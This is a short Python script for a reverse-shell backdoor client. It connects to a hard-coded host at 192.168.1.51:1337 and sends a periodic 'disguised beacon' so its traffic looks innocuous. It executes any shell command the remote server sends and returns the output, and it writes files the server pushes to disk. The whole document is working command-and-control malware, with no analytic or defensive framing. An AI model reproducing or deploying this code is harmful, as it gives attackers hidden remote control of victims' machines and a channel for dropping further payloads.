
import socket
import subprocess
import threading
import time

# Function to receive file
def receive_file(conn, filename):
    with open(filename, 'wb') as file:
        data = conn.recv(1024)
        while data:
            file.write(data)
            data = conn.recv(1024)

# Function to send disguised beacon
def send_beacon(conn):
    while True:
        time.sleep(20)  # Wait for 20 seconds
        disguised_beacon = "random_message"  # The disguised beacon
        conn.sendall(disguised_beacon.encode())
        print("Beacon sent")

# Main function
def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('192.168.1.51', 1337))

    # Start the beacon thread
    beacon_thread = threading.Thread(target=send_beacon, args=(client_socket,))
    beacon_thread.daemon = True  # Daemonize thread to close when main program exits
    beacon_thread.start()

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower().startswith('file:'):
            filename = command.split(':', 1)[1]
            receive_file(client_socket, filename)
        elif command.lower() == 'random_message':  # Server-side code should recognize this as a beacon
            print("Beacon acknowledged by server")
        else:
            output = subprocess.getoutput(command)
            client_socket.sendall(output.encode())

if __name__ == "__main__":
    main()
